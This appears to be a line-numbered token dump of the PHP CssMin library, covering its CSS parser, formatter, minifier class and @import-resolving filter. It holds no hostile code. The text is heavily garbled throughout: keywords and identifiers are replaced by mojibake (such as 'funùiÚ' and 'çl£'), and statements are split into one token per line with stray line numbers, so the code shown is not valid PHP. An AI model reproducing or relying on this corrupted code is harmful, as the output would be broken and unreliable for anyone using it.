$Çme
 . "</code> w™hhşas Çm<code>" . 
$şass
 . "</code> was‚ot found"));

1474 ià(!
	`is_nuÎ
(
$sourû
))

1476 
$this
->
	`·r£
(
$sourû
);

1485 
public
 
funùiÚ
 
	$­³ndTok’
(
aCssTok’
 
$tok’
)

1487 
$this
->
tok’s
[] = 
$tok’
;

1488 
	}
}

1494 
public
 
funùiÚ
 
	$ş—rBufãr
()

1496 
$this
->
bufãr
 = "";

1497 
	}
}

1505 
public
 
funùiÚ
 
g‘AndCË¬Bufãr
(
$Œim
 = "", 
$tŞow”
 = 
çl£
)

1507 
$r
 = 
$this
->
g‘Bufãr
(
$Œim
, 
$tŞow”
);

1508 
	g$this
->
	gbufãr
 = "";

1509  
	g$r
;

1518 
public
 
funùiÚ
 
g‘Bufãr
(
$Œim
 = "", 
$tŞow”
 = 
çl£
)

1520 
$r
 = 
$this
->
bufãr
;

1521 ià(
	g$Œim
)

1523 
	g$r
 = 
Œim
(
$r
, " \t\n\r\0\x0B" . 
$Œim
);

1525 ià(
	g$tŞow”
)

1527 
	g$r
 = 
¡¹Şow”
(
$r
);

1529  
	g$r
;

1536 
public
 
funùiÚ
 
	$g‘MedŸTy³s
()

1538  
$this
->
¡©eMedŸTy³s
;

1539 
	}
}

1545 
public
 
funùiÚ
 
	$g‘Sourû
()

1547  
$this
->
sourû
;

1548 
	}
}

1554 
public
 
funùiÚ
 
	$g‘S‹
()

1556  
$this
->
¡©e
;

1557 
	}
}

1564 
public
 
funùiÚ
 
	$g‘Plugš
(
$şass
)

1566 
$šdex
 = 
nuÎ
;

1567 ià(
	`is_nuÎ
(
$šdex
))

1569 
$šdex
 = 
	`¬¿y
();

1570 
$i
 = 0, 
$l
 = 
	`couÁ
(
$this
->
¶ugšs
); $i < $l; $i++)

1572 
$šdex
[
	`g‘_şass
(
$this
->
¶ugšs
[
$i
])] = $i;

1575  
	`is£t
(
$šdex
[
$şass
]è? 
$this
->
¶ugšs
[$šdex[$şass]] : 
çl£
;

1576 
	}
}

1582 
public
 
funùiÚ
 
	$g‘Tok’s
()

1584  
$this
->
tok’s
;

1585 
	}
}

1592 
public
 
funùiÚ
 
	$isS‹
(
$¡©e
)

1594  (
$this
->
¡©e
 =ğ
$¡©e
);

1595 
	}
}

1602 
public
 
funùiÚ
 
	$·r£
(
$sourû
)

1605 
$this
->
sourû
 = "";

1606 
$this
->
tok’s
 = 
	`¬¿y
();

1609 
$glob®Trigg”Ch¬s
 = "";

1610 
$¶ugšs
 = 
$this
->
¶ugšs
;

1611 
$¶ugšCouÁ
 = 
	`couÁ
(
$¶ugšs
);

1612 
$¶ugšIndex
 = 
	`¬¿y
();

1613 
$¶ugšTrigg”S‹s
 = 
	`¬¿y
();

1614 
$¶ugšTrigg”Ch¬s
 = 
	`¬¿y
();

1615 
$i
 = 0, 
$l
 = 
	`couÁ
(
$¶ugšs
); $i < $l; $i++)

1617 
$tPlugšCÏssName
 = 
	`g‘_şass
(
$¶ugšs
[
$i
]);

1618 
$¶ugšTrigg”Ch¬s
[
$i
] = 
	`im¶ode
("", 
$¶ugšs
[$i]->
	`g‘Trigg”Ch¬s
());

1619 
$tPlugšTrigg”S‹s
 = 
$¶ugšs
[
$i
]->
	`g‘Trigg”S‹s
();

1620 
$¶ugšTrigg”S‹s
[
$i
] = 
$tPlugšTrigg”S‹s
 ==ğ
çl£
 ? f®£ : "|" . 
	`im¶ode
("|", $tPluginTriggerStates) . "|";

1621 
$¶ugšIndex
[
$tPlugšCÏssName
] = 
$i
;

1622 
$ii
 = 0, 
$Î
 = 
	`¡¾’
(
$¶ugšTrigg”Ch¬s
[
$i
]); $ii < $ll; $ii++)

1624 
$c
 = 
	`sub¡r
(
$¶ugšTrigg”Ch¬s
[
$i
], 
$ii
, 1);

1625 ià(
	`¡½os
(
$glob®Trigg”Ch¬s
, 
$c
è==ğ
çl£
)

1627 
$glob®Trigg”Ch¬s
 .ğ
$c
;

1632 
$sourû
 = 
	`¡r_»¶aû
("\r\n", "\n", $source);

1633 
$sourû
 = 
	`¡r_»¶aû
("\r", "\n", $source);

1634 
$this
->
sourû
 = 
$sourû
;

1636 
$bufãr
 = &
$this
->
bufãr
;

1637 
$exşusive
 = &
$this
->
¡©eExşusive
;

1638 
$¡©e
 = &
$this
->
¡©e
;

1639 
$c
 = 
$p
 = 
nuÎ
;

1641 
$i
 = 0, 
$l
 = 
	`¡¾’
(
$sourû
); $i < $l; $i++)

1644 
$c
 = 
$sourû
[
$i
];

1646 ià(
$exşusive
 ==ğ
çl£
)

1648 ià(
$c
 === "\n" || $c === "\t")

1650 
$c
 = " ";

1652 ià(
$c
 ==ğ" " && 
$p
 === " ")

1657 
$bufãr
 .ğ
$c
;

1659 ià(
	`¡½os
(
$glob®Trigg”Ch¬s
, 
$c
è!=ğ
çl£
)

1662 ià(
$exşusive
)

1664 
$tPlugšIndex
 = 
$¶ugšIndex
[
$exşusive
];

1665 ià(
	`¡½os
(
$¶ugšTrigg”Ch¬s
[
$tPlugšIndex
], 
$c
è!=ğ
çl£
 && (
$¶ugšTrigg”S‹s
[$tPlugšIndex] ==ğçl£ || sŒpos($¶ugšTrigg”S‹s[$tPlugšIndex], 
$¡©e
) !== false))

1667 
$r
 = 
$¶ugšs
[
$tPlugšIndex
]->
	`·r£
(
$i
, 
$c
, 
$p
, 
$¡©e
);

1669 ià(
$r
 ==ğ
Œue
)

1674 
	`–£if
 (
$r
 !=ğ
çl£
 && $¸!ğ
$i
)

1676 
$i
 = 
$r
;

1684 
$Œigg”S‹
 = "|" . 
$¡©e
 . "|";

1685 
$ii
 = 0, 
$Î
 = 
$¶ugšCouÁ
; $ii < $ll; $ii++)

1688 ià(
	`¡½os
(
$¶ugšTrigg”Ch¬s
[
$ii
], 
$c
è!=ğ
çl£
 && (
$¶ugšTrigg”S‹s
[$ii] ==ğçl£ || sŒpos($¶ugšTrigg”S‹s[$ii], 
$Œigg”S‹
) !== false))

1691 
$r
 = 
$¶ugšs
[
$ii
]->
	`·r£
(
$i
, 
$c
, 
$p
, 
$¡©e
);

1693 ià(
$r
 ==ğ
Œue
)

1698 
	`–£if
 (
$r
 !=ğ
çl£
 && $¸!ğ
$i
)

1700 
$i
 = 
$r
;

1707 
$p
 = 
$c
;

1709  
$this
->
tok’s
;

1710 
	}
}

1716 
public
 
funùiÚ
 
	$pİS‹
()

1718 
$r
 = 
	`¬¿y_pİ
(
$this
->
¡©es
);

1719 
$this
->
¡©e
 = $this->
¡©es
[
	`couÁ
($this->states) - 1];

1720  
$r
;

1721 
	}
}

1728 
public
 
funùiÚ
 
	$pushS‹
(
$¡©e
)

1730 
$r
 = 
	`¬¿y_push
(
$this
->
¡©es
, 
$¡©e
);

1731 
$this
->
¡©e
 = $this->
¡©es
[
	`couÁ
($this->states) - 1];

1732  
$r
;

1733 
	}
}

1740 
public
 
funùiÚ
 
	$£tBufãr
(
$bufãr
)

1742 
$this
->
bufãr
 = 
$bufãr
;

1743 
	}
}

1750 
public
 
funùiÚ
 
	$£tExşusive
(
$exşusive
)

1752 
$this
->
¡©eExşusive
 = 
$exşusive
;

1753 
	}
}

1760 
public
 
funùiÚ
 
	$£tMedŸTy³s
(
¬¿y
 
$medŸTy³s
)

1762 
$this
->
¡©eMedŸTy³s
 = 
$medŸTy³s
;

1763 
	}
}

1770 
public
 
funùiÚ
 
	$£tS‹
(
$¡©e
)

1772 
$r
 = 
	`¬¿y_pİ
(
$this
->
¡©es
);

1773 
	`¬¿y_push
(
$this
->
¡©es
, 
$¡©e
);

1774 
$this
->
¡©e
 = $this->
¡©es
[
	`couÁ
($this->states) - 1];

1775  
$r
;

1776 
	}
}

1782 
public
 
funùiÚ
 
	$un£tExşusive
()

1784 
$this
->
¡©eExşusive
 = 
çl£
;

1785 
	}
}

1791 
public
 
funùiÚ
 
	$un£tMedŸTy³s
()

1793 
$this
->
¡©eMedŸTy³s
 = 
çl£
;

1794 
	}
}

1807 şas 
	cCssOtbsFÜm©‹r
 
ex‹nds
 
	maCssFÜm©‹r


1814 
public
 
funùiÚ
 
	$__toSŒšg
()

1816 
$r
 = 
	`¬¿y
();

1817 
$Ëv–
 = 0;

1818 
$i
 = 0, 
$l
 = 
	`couÁ
(
$this
->
tok’s
); $i < $l; $i++)

1820 
$tok’
 = 
$this
->
tok’s
[
$i
];

1821 
$şass
 = 
	`g‘_şass
(
$tok’
);

1822 
$šd’t
 = 
	`¡r_»³©
(
$this
->
šd’t
, 
$Ëv–
);

1823 ià(
$şass
 === "CssCommentToken")

1825 
$lšes
 = 
	`¬¿y_m­
("Œim", 
	`ex¶ode
("\n", 
$tok’
->
Comm’t
));

1826 
$ii
 = 0, 
$Î
 = 
	`couÁ
(
$lšes
); $ii < $ll; $ii++)

1828 
$r
[] = 
$šd’t
 . (
	`sub¡r
(
$lšes
[
$ii
], 0, 1) == "*" ? " " : "") . $lines[$ii];

1831 
	`–£if
 (
$şass
 === "CssAtCharsetToken")

1833 
$r
[] = 
$šd’t
 . "@ch¬£ˆ" . 
$tok’
->
Ch¬£t
 . ";";

1835 
	`–£if
 (
$şass
 === "CssAtFontFaceStartToken")

1837 
$r
[] = 
$šd’t
 . "@font-face {";

1838 
$Ëv–
++;

1840 
	`–£if
 (
$şass
 === "CssAtImportToken")

1842 
$r
[] = 
$šd’t
 . "@impÜˆ" . 
$tok’
->
ImpÜt
 . " " . 
	`im¶ode
(", ", $tok’->
MedŸTy³s
) . ";";

1844 
	`–£if
 (
$şass
 === "CssAtKeyframesStartToken")

1846 
$r
[] = 
$šd’t
 . "@keyäame \"" . 
$tok’
->
Name
 . "\" {";

1847 
$Ëv–
++;

1849 
	`–£if
 (
$şass
 === "CssAtMediaStartToken")

1851 
$r
[] = 
$šd’t
 . "@medŸ " . 
	`im¶ode
(", ", 
$tok’
->
MedŸTy³s
) . " {";

1852 
$Ëv–
++;

1854 
	`–£if
 (
$şass
 === "CssAtPageStartToken")

1856 
$r
[] = 
$šd’t
 . "@page {";

1857 
$Ëv–
++;

1859 
	`–£if
 (
$şass
 === "CssAtVariablesStartToken")

1861 
$r
[] = 
$šd’t
 . "@v¬ŸbË " . 
	`im¶ode
(", ", 
$tok’
->
MedŸTy³s
) . " {";

1862 
$Ëv–
++;

1864 
	`–£if
 (
$şass
 === "CssRulesetStartToken" || $class === "CssAtKeyframesRulesetStartToken")

1866 
$r
[] = 
$šd’t
 . 
	`im¶ode
(", ", 
$tok’
->
S–eùÜs
) . " {";

1867 
$Ëv–
++;

1869 
	`–£if
 (
$şass
 == "CssAtFontFaceDeclarationToken"

1870 || 
$şass
 === "CssAtKeyframesRulesetDeclarationToken"

1871 || 
$şass
 === "CssAtPageDeclarationToken"

1872 || 
$şass
 == "CssAtVariablesDeclarationToken"

1873 || 
$şass
 === "CssRulesetDeclarationToken"

1876 
$deş¬©iÚ
 = 
$šd’t
 . 
$tok’
->
Prİ”ty
 . ": ";

1877 ià(
$this
->
·ddšg
)

1879 
$deş¬©iÚ
 = 
	`¡r_·d
($deş¬©iÚ, 
$this
->
·ddšg
, " ", 
STR_PAD_RIGHT
);

1881 
$r
[] = 
$deş¬©iÚ
 . 
$tok’
->
V®ue
 . ($tok’->
IsImpÜÁ
 ? " !important" : "") . ";";

1883 
	`–£if
 (
$şass
 === "CssAtFontFaceEndToken"

1884 || 
$şass
 === "CssAtMediaEndToken"

1885 || 
$şass
 === "CssAtKeyframesEndToken"

1886 || 
$şass
 === "CssAtKeyframesRulesetEndToken"

1887 || 
$şass
 === "CssAtPageEndToken"

1888 || 
$şass
 === "CssAtVariablesEndToken"

1889 || 
$şass
 === "CssRulesetEndToken"

1892 
$Ëv–
--;

1893 
$r
[] = 
	`¡r_»³©
(
$šd’t
, 
$Ëv–
) . "}";

1896  
	`im¶ode
("\n", 
$r
);

1898 
	}
}

1910 şas 
	cCssNuÎTok’
 
ex‹nds
 
	maCssTok’


1917 
public
 
funùiÚ
 
	$__toSŒšg
()

1921 
	}
}

1933 şas 
	cCssMšif›r


1940 
´iv©e
 
	m$f‹rs
 = 
¬¿y
();

1946 
´iv©e
 
	m$¶ugšs
 = 
¬¿y
();

1952 
´iv©e
 
	m$mšif›d
 = "";

1963 
public
 
funùiÚ
 
	$__cÚ¡ruù
(
$sourû
 = 
nuÎ
, 
¬¿y
 
$f‹rs
 =‚uÎ,‡¼ay 
$¶ugšs
 =‚ull)

1965 
$f‹rs
 = 
	`¬¿y_m”ge
(
¬¿y


1967 "ImpÜtImpÜts" => 
çl£
,

1968 "RemoveComm’ts" => 
Œue
,

1969 "RemoveEm±yRuË£ts" => 
Œue
,

1970 "RemoveEm±yAtBlocks" => 
Œue
,

1971 "CÚv”tLev–3Prİ”t›s" => 
çl£
,

1972 "CÚv”tLev–3AtKeyäames" => 
çl£
,

1973 "V¬ŸbËs" => 
Œue
,

1974 "RemoveLa¡D–¬©iÚSemiCŞÚ" => 
Œue


1975 ), 
	`is_¬¿y
(
$f‹rs
è? $f‹r : 
	`¬¿y
());

1976 
$¶ugšs
 = 
	`¬¿y_m”ge
(
¬¿y


1978 "V¬ŸbËs" => 
Œue
,

1979 "CÚv”tFÚtWeight" => 
çl£
,

1980 "CÚv”tH¦CŞÜs" => 
çl£
,

1981 "CÚv”tRgbCŞÜs" => 
çl£
,

1982 "CÚv”tNamedCŞÜs" => 
çl£
,

1983 "Com´essCŞÜV®ues" => 
çl£
,

1984 "Com´essUn™V®ues" => 
çl£
,

1985 "Com´essEx´essiÚV®ues" => 
çl£


1986 ), 
	`is_¬¿y
(
$¶ugšs
è? $¶ugš : 
	`¬¿y
());

1988 
	`fÜ—ch
 (
$f‹rs
 
as
 
$Çme
 => 
$cÚfig
)

1990 ià(
$cÚfig
 !=ğ
çl£
)

1992 
$şass
 = "Css" . 
$Çme
 . "MinifierFilter";

1993 
$cÚfig
 = 
	`is_¬¿y
($cÚfigè? $cÚfig : 
	`¬¿y
();

1994 ià(
	`şass_exi¡s
(
$şass
))

1996 
$this
->
f‹rs
[] = 
Ãw
 
	`$şass
($this, 
$cÚfig
);

2000 
CssMš
::
	`Œigg”E¼Ü
(
Ãw
 
	`CssE¼Ü
(
__FILE__
, 
__LINE__
, 
__METHOD__
 . ": Thf‹¸<code>" . 
$Çme
 . "</code> w™hhşas Çm<code>" . 
$şass
 . "</code> was‚ot found"));

2005 
	`fÜ—ch
 (
$¶ugšs
 
as
 
$Çme
 => 
$cÚfig
)

2007 ià(
$cÚfig
 !=ğ
çl£
)

2009 
$şass
 = "Css" . 
$Çme
 . "MinifierPlugin";

2010 
$cÚfig
 = 
	`is_¬¿y
($cÚfigè? $cÚfig : 
	`¬¿y
();

2011 ià(
	`şass_exi¡s
(
$şass
))

2013 
$this
->
¶ugšs
[] = 
Ãw
 
	`$şass
($this, 
$cÚfig
);

2017 
CssMš
::
	`Œigg”E¼Ü
(
Ãw
 
	`CssE¼Ü
(
__FILE__
, 
__LINE__
, 
__METHOD__
 . ": Th¶ugš <code>" . 
$Çme
 . "</code> w™hhşas Çm<code>" . 
$şass
 . "</code> was‚ot found"));

2022 ià(!
	`is_nuÎ
(
$sourû
))

2024 
$this
->
	`mšify
(
$sourû
);

2032 
public
 
funùiÚ
 
	$g‘Mšif›d
()

2034  
$this
->
mšif›d
;

2035 
	}
}

2042 
public
 
funùiÚ
 
	$g‘Plugš
(
$şass
)

2044 
$šdex
 = 
nuÎ
;

2045 ià(
	`is_nuÎ
(
$šdex
))

2047 
$šdex
 = 
	`¬¿y
();

2048 
$i
 = 0, 
$l
 = 
	`couÁ
(
$this
->
¶ugšs
); $i < $l; $i++)

2050 
$šdex
[
	`g‘_şass
(
$this
->
¶ugšs
[
$i
])] = $i;

2053  
	`is£t
(
$šdex
[
$şass
]è? 
$this
->
¶ugšs
[$šdex[$şass]] : 
çl£
;

2054 
	}
}

2061 
public
 
funùiÚ
 
	$mšify
(
$sourû
)

2064 
$r
 = "";

2065 
$·r£r
 = 
Ãw
 
	`CssP¬£r
(
$sourû
);

2066 
$tok’s
 = 
$·r£r
->
	`g‘Tok’s
();

2067 
$f‹rs
 = 
$this
->
f‹rs
;

2068 
$f‹rCouÁ
 = 
	`couÁ
(
$this
->
f‹rs
);

2069 
$¶ugšs
 = 
$this
->
¶ugšs
;

2070 
$¶ugšCouÁ
 = 
	`couÁ
(
$¶ugšs
);

2071 
$¶ugšIndex
 = 
	`¬¿y
();

2072 
$¶ugšTrigg”Tok’s
 = 
	`¬¿y
();

2073 
$glob®Trigg”Tok’s
 = 
	`¬¿y
();

2074 
$i
 = 0, 
$l
 = 
	`couÁ
(
$¶ugšs
); $i < $l; $i++)

2076 
$tPlugšCÏssName
 = 
	`g‘_şass
(
$¶ugšs
[
$i
]);

2077 
$¶ugšTrigg”Tok’s
[
$i
] = 
$¶ugšs
[$i]->
	`g‘Trigg”Tok’s
();

2078 
	`fÜ—ch
 (
$¶ugšTrigg”Tok’s
[
$i
] 
as
 
$v
)

2080 ià(!
	`š_¬¿y
(
$v
, 
$glob®Trigg”Tok’s
))

2082 
$glob®Trigg”Tok’s
[] = 
$v
;

2085 
$¶ugšTrigg”Tok’s
[
$i
] = "|" . 
	`im¶ode
("|", $pluginTriggerTokens[$i]) . "|";

2086 
$¶ugšIndex
[
$tPlugšCÏssName
] = 
$i
;

2088 
$glob®Trigg”Tok’s
 = "|" . 
	`im¶ode
("|", $globalTriggerTokens) . "|";

2092 
$i
 = 0; $˜< 
$f‹rCouÁ
; $i++)

2095 ià(
$f‹rs
[
$i
]->
	`­¶y
(
$tok’s
) > 0)

2098 
$tok’s
 = 
	`¬¿y_v®ues
(
	`¬¿y_f‹r
($tokens));

2101 
$tok’CouÁ
 = 
	`couÁ
(
$tok’s
);

2105 
$i
 = 0; $˜< 
$tok’CouÁ
; $i++)

2107 
$Œigg”Tok’
 = "|" . 
	`g‘_şass
(
$tok’s
[
$i
]) . "|";

2108 ià(
	`¡½os
(
$glob®Trigg”Tok’s
, 
$Œigg”Tok’
è!=ğ
çl£
)

2110 
$ii
 = 0; $i˜< 
$¶ugšCouÁ
; $ii++)

2112 ià(
	`¡½os
(
$¶ugšTrigg”Tok’s
[
$ii
], 
$Œigg”Tok’
è!=ğ
çl£
 || $pluginTriggerTokens[$ii] === false)

2115 ià(
$¶ugšs
[
$ii
]->
	`­¶y
(
$tok’s
[
$i
]è==ğ
Œue
)

2124 
$i
 = 0; $˜< 
$tok’CouÁ
; $i++)

2126 
$r
 .ğ(
¡ršg
è
$tok’s
[
$i
];

2128 
$this
->
mšif›d
 = 
$r
;

2129  
$r
;

2130 
	}
}

2165 şas 
	cCssMš


2172 
´iv©e
 
	m$şassIndex
 = 
¬¿y
();

2178 
´iv©e
 
	m$”rÜs
 = 
¬¿y
();

2184 
´iv©e
 
	m$isV”bo£
 = 
çl£
;

2191 
public
 
funùiÚ
 
	$autŞßd
(
$şass
)

2193 ià(
	`is£t
(
£lf
::
$şassIndex
[
$şass
]))

2195 
	`»quœe
(
£lf
::
$şassIndex
[
$şass
]);

2203 
public
 
funùiÚ
 
	$g‘E¼Üs
()

2205  
£lf
::
$”rÜs
;

2206 
	}
}

2212 
public
 
funùiÚ
 
	$hasE¼Üs
()

2214  
	`couÁ
(
£lf
::
$”rÜs
) > 0;

2215 
	}
}

2221 
public
 
funùiÚ
 
	$š™Ÿli£
()

2224 
$·ths
 = 
	`¬¿y
(
	`dœÇme
(
__FILE__
));

2225 
	`li¡
(
$i
, 
$·th
èğ
	`—ch
(
$·ths
))

2227 
$subDœeùÜys
 = 
	`glob
(
$·th
 . "*", 
GLOB_MARK
 | 
GLOB_ONLYDIR
 | 
GLOB_NOSORT
);

2228 ià(
	`is_¬¿y
(
$subDœeùÜys
))

2230 
	`fÜ—ch
 (
$subDœeùÜys
 
as
 
$subDœeùÜy
)

2232 
$·ths
[] = 
$subDœeùÜy
;

2235 
$fes
 = 
	`glob
(
$·th
 . "*.php", 0);

2236 ià(
	`is_¬¿y
(
$fes
))

2238 
	`fÜ—ch
 (
$fes
 
as
 
$fe
)

2240 
$şass
 = 
	`sub¡r
(
	`ba£Çme
(
$fe
), 0, -4);

2241 
£lf
::
$şassIndex
[
$şass
] = 
$fe
;

2245 
	`krsÜt
(
£lf
::
$şassIndex
);

2248 ià(
	`funùiÚ_exi¡s
("¥l_autŞßd_»gi¡”"è&& !
	`is_ÿÎabË
("__autoload"))

2250 
	`¥l_autŞßd_»gi¡”
(
	`¬¿y
(
__CLASS__
, "autoload"));

2255 
	`fÜ—ch
 (
£lf
::
$şassIndex
 
as
 
$şass
 => 
$fe
)

2257 ià(!
	`şass_exi¡s
(
$şass
))

2259 
	`»quœe_Úû
(
$fe
);

2263 
	}
}

2272 
public
 
funùiÚ
 
	$mšify
(
$sourû
, 
¬¿y
 
$f‹rs
 = 
nuÎ
,‡¼ay 
$¶ugšs
 =‚ull)

2274 
£lf
::
$”rÜs
 = 
	`¬¿y
();

2275 
$mšif›r
 = 
Ãw
 
	`CssMšif›r
(
$sourû
, 
$f‹rs
, 
$¶ugšs
);

2276  
$mšif›r
->
	`g‘Mšif›d
();

2277 
	}
}

2285 
public
 
funùiÚ
 
	$·r£
(
$sourû
, 
¬¿y
 
$¶ugšs
 = 
nuÎ
)

2287 
£lf
::
$”rÜs
 = 
	`¬¿y
();

2288 
$·r£r
 = 
Ãw
 
	`CssP¬£r
(
$sourû
, 
$¶ugšs
);

2289  
$·r£r
->
	`g‘Tok’s
();

2290 
	}
}

2297 
public
 
funùiÚ
 
	$£tV”bo£
(
$to
)

2299 
£lf
::
$isV”bo£
 = (
boŞ—n
è
$to
;

2300  
£lf
::
$isV”bo£
;

2301 
	}
}

2308 
public
 
funùiÚ
 
	$Œigg”E¼Ü
(
CssE¼Ü
 
$”rÜ
)

2310 
£lf
::
$”rÜs
[] = 
$”rÜ
;

2311 ià(
£lf
::
$isV”bo£
)

2313 
	`Œigg”_”rÜ
((
¡ršg
è
$”rÜ
, 
E_USER_WARNING
);

2315 
	}
}

2318 
	gCssMš
::
š™Ÿli£
();

2331 şas 
	cCssImpÜtImpÜtsMšif›rF‹r
 
ex‹nds
 
	maCssMšif›rF‹r


2338 
´iv©e
 
	m$impÜ‹d
 = 
¬¿y
();

2345 
public
 
funùiÚ
 
	$­¶y
(
¬¿y
 &
$tok’s
)

2347 ià(!
	`is£t
(
$this
->
cÚfigu¿tiÚ
["Ba£P©h"]è|| !
	`is_dœ
($this->configuration["BasePath"]))

2349 
CssMš
::
	`Œigg”E¼Ü
(
Ãw
 
	`CssE¼Ü
(
__FILE__
, 
__LINE__
, 
__METHOD__
 . ": Ba£…©h <code>" . (
$this
->
cÚfigu¿tiÚ
["BasePath"] ? $this->configuration["BasePath"] : "null"). "</code> is‚ot‡ directory"));

2352 
$i
 = 0, 
$l
 = 
	`couÁ
(
$tok’s
); $i < $l; $i++)

2354 ià(
	`g‘_şass
(
$tok’s
[
$i
]) === "CssAtImportToken")

2356 
$impÜt
 = 
$this
->
cÚfigu¿tiÚ
["Ba£P©h"] . "/" . 
$tok’s
[
$i
]->
ImpÜt
;

2358 ià(!
	`is_fe
(
$impÜt
))

2360 
CssMš
::
	`Œigg”E¼Ü
(
Ãw
 
	`CssE¼Ü
(
__FILE__
, 
__LINE__
, 
__METHOD__
 . ": ImpÜˆf<code>" . 
$impÜt
. "</code> wa nÙ found.", (
¡ršg
è
$tok’s
[
$i
]));

2363 
	`–£if
 (
	`š_¬¿y
(
$impÜt
, 
$this
->
impÜ‹d
))

2365 
CssMš
::
	`Œigg”E¼Ü
(
Ãw
 
	`CssE¼Ü
(
__FILE__
, 
__LINE__
, 
__METHOD__
 . ": ImpÜˆf<code>" . 
$impÜt
. "</code> wa ®»ady impÜ‹d.", (
¡ršg
è
$tok’s
[
$i
]));

2366 
$tok’s
[
$i
] = 
nuÎ
;

2370 
$this
->
impÜ‹d
[] = 
$impÜt
;

2371 
$·r£r
 = 
Ãw
 
	`CssP¬£r
(
	`fe_g‘_cÚ‹Ás
(
$impÜt
));

2372 
$impÜt
 = 
$·r£r
->
	`g‘Tok’s
();

2374 ià(
	`couÁ
(
$tok’s
[
$i
]->
MedŸTy³s
) > 0 && !(count($tokens[$i]->MediaTypes) == 1 && $tokens[$i]->MediaTypes[0] == "all"))

2376 
$blocks
 = 
	`¬¿y
();

2380 
$ii
 = 0, 
$Î
 = 
	`couÁ
(
$impÜt
); $ii < $ll; $ii++)

2382 ià(
	`g‘_şass
(
$impÜt
[
$ii
]) === "CssAtImportToken")

2385 ià(
	`couÁ
(
$impÜt
[
$ii
]->
MedŸTy³s
) == 0 || (count($import[$ii]->MediaTypes) == 1 && $import[$ii]->MediaTypes[0] == "all"))

2387 
$impÜt
[
$ii
]->
MedŸTy³s
 = 
$tok’s
[
$i
]->MediaTypes;

2390 
	`–£if
 (
	`couÁ
(
$impÜt
[
$ii
]->
MedŸTy³s
) > 0)

2392 
	`fÜ—ch
 (
$impÜt
[
$ii
]->
MedŸTy³s
 
as
 
$šdex
 => 
$medŸTy³
)

2394 ià(!
	`š_¬¿y
(
$medŸTy³
, 
$tok’s
[
$i
]->
MedŸTy³s
))

2396 
	`un£t
(
$impÜt
[
$ii
]->
MedŸTy³s
[
$šdex
]);

2399 
$impÜt
[
$ii
]->
MedŸTy³s
 = 
	`¬¿y_v®ues
($import[$ii]->MediaTypes);

2401 ià(
	`couÁ
(
$impÜt
[
$ii
]->
MedŸTy³s
) == 0)

2403 
$impÜt
[
$ii
] = 
nuÎ
;

2411 
$ii
 = 0, 
$Î
 = 
	`couÁ
(
$impÜt
); $ii < $ll; $ii++)

2413 ià(
	`g‘_şass
(
$impÜt
[
$ii
]) === "CssAtMediaStartToken")

2415 
	`fÜ—ch
 (
$impÜt
[
$ii
]->
MedŸTy³s
 
as
 
$šdex
 => 
$medŸTy³
)

2417 ià(!
	`š_¬¿y
(
$medŸTy³
, 
$tok’s
[
$i
]->
MedŸTy³s
))

2419 
	`un£t
(
$impÜt
[
$ii
]->
MedŸTy³s
[
$šdex
]);

2421 
$impÜt
[
$ii
]->
MedŸTy³s
 = 
	`¬¿y_v®ues
($import[$ii]->MediaTypes);

2428 
$ii
 = 0, 
$Î
 = 
	`couÁ
(
$impÜt
); $ii < $ll; $ii++)

2430 ià(
	`g‘_şass
(
$impÜt
[
$ii
]) === "CssAtMediaStartToken")

2432 ià(
	`couÁ
(
$impÜt
[
$ii
]->
MedŸTy³s
) === 0)

2434 
$iii
 = 
$ii
; $ii˜< 
$Î
; $iii++)

2436 ià(
	`g‘_şass
(
$impÜt
[
$iii
]) === "CssAtMediaEndToken")

2441 ià(
	`g‘_şass
(
$impÜt
[
$iii
]) === "CssAtMediaEndToken")

2443 
	`¬¿y_¥liû
(
$impÜt
, 
$ii
, 
$iii
 - $i˜+ 1, 
	`¬¿y
());

2444 
$Î
 = 
	`couÁ
(
$impÜt
);

2453 
$ii
 = 0, 
$Î
 = 
	`couÁ
(
$impÜt
); $ii < $ll; $ii++)

2455 ià(
	`g‘_şass
(
$impÜt
[
$ii
]è==ğ"CssAtMedŸS¹Tok’" && 
	`couÁ
(
	`¬¿y_diff
(
$tok’s
[
$i
]->
MedŸTy³s
, $import[$ii]->MediaTypes)) === 0)

2457 
$iii
 = 
$ii
; $ii˜< 
$Î
; $iii++)

2459 ià(
	`g‘_şass
(
$impÜt
[
$iii
]) == "CssAtMediaEndToken")

2464 ià(
	`g‘_şass
(
$impÜt
[
$iii
]) == "CssAtMediaEndToken")

2466 
	`un£t
(
$impÜt
[
$ii
]);

2467 
	`un£t
(
$impÜt
[
$iii
]);

2468 
$impÜt
 = 
	`¬¿y_v®ues
($import);

2469 
$Î
 = 
	`couÁ
(
$impÜt
);

2476 
$ii
 = 0, 
$Î
 = 
	`couÁ
(
$impÜt
); $ii < $ll; $ii++)

2478 
$şass
 = 
	`g‘_şass
(
$impÜt
[
$ii
]);

2479 ià(
$şass
 === "CssAtImportToken" || $class === "CssAtCharsetToken")

2481 
$blocks
 = 
	`¬¿y_m”ge
($blocks, 
	`¬¿y_¥liû
(
$impÜt
, 
$ii
, 1, 
	`¬¿y
()));

2482 
$Î
 = 
	`couÁ
(
$impÜt
);

2488 
$ii
 = 0, 
$Î
 = 
	`couÁ
(
$impÜt
); $ii < $ll; $ii++)

2490 
$şass
 = 
	`g‘_şass
(
$impÜt
[
$ii
]);

2491 ià(
$şass
 === "CssAtFontFaceStartToken" || $class === "CssAtMediaStartToken" || $class === "CssAtPageStartToken" || $class === "CssAtVariablesStartToken")

2493 
$iii
 = 
$ii
; $ii˜< 
$Î
; $iii++)

2495 
$şass
 = 
	`g‘_şass
(
$impÜt
[
$iii
]);

2496 ià(
$şass
 === "CssAtFontFaceEndToken" || $class === "CssAtMediaEndToken" || $class === "CssAtPageEndToken" || $class === "CssAtVariablesEndToken")

2501 
$şass
 = 
	`g‘_şass
(
$impÜt
[
$iii
]);

2502 ià(
	`is£t
(
$impÜt
[
$iii
]è&& (
$şass
 === "CssAtFontFaceEndToken" || $class === "CssAtMediaEndToken" || $class === "CssAtPageEndToken" || $class === "CssAtVariablesEndToken"))

2504 
$blocks
 = 
	`¬¿y_m”ge
($blocks, 
	`¬¿y_¥liû
(
$impÜt
, 
$ii
, 
$iii
 - $i˜+ 1, 
	`¬¿y
()));

2505 
$Î
 = 
	`couÁ
(
$impÜt
);

2510 
$impÜt
 = 
	`¬¿y_m”ge
(
$blocks
, 
	`¬¿y
(
Ãw
 
	`CssAtMedŸS¹Tok’
(
$tok’s
[
$i
]->
MedŸTy³s
)), $impÜt,‡¼ayÒew 
	`CssAtMedŸEndTok’
()));

2513 
	`¬¿y_¥liû
(
$tok’s
, 
$i
, 1, 
$impÜt
);

2515 
$i
--;

2516 
